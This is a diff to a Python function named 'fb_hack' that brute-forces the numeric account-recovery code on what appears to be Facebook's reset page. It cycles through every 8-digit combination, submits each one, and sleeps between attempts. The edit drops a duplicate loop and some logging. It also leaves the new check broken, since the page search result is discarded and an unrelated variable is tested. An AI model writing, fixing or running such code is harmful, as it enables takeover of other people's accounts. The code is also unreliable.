@@ -94,52 +94,21 @@ def fb_hack(email, codex):
       else:
         break
   elif check2 != test:
-    print(check2)
     attempt = int(codex)
+    print(check2)
     for combination in itertools.product(range(10), repeat=8):
-      y = (''.join(map(str, combination)))
+      y = str(''.join(map(str, combination)))
       print(y)
       browser.select_form(nr=0)
       browser.set_value(str(y), nr=5)
       browser.submit()
-      sleepy(30)
-      break
-    for combination in itertools.product(range(10), repeat=8):
-      y = (''.join(map(str, combination)))
-      print(y)
-      browser.select_form(nr=0)
-      browser.set_value(str(y), nr=5)
-      browser.submit()
-      forms = list(browser.forms())
-      form = forms[0]
-      print(form)
-      browser.submit()
-      fail = (str(y), "failed")
-      success = (str(y), "succeded")
-      s = " "
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
-      check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
-      if check2 != test:
-        print(s.join(fail))
-        attempt += 1
-        reset1 = attempt
+      soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+      if check1 != test:
         sleepy(30)
       else:
-        response1 = browser.response()
-        soup = BeautifulSoup(response1, 'html.parser')
-        with open("output1.html", "w") as file:
-          file.write(str(soup))
         break
-        response1 = browser.response()
-        soup = BeautifulSoup(response1, 'html.parser')
-        with open("output1.html", "w") as file:
-          file.write(str(soup))
-        with open("output1.txt", "w") as file:
-          file.write(str(soup))
-        print(attempt)
-        print("error")
-        sys.exit()
   else:
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
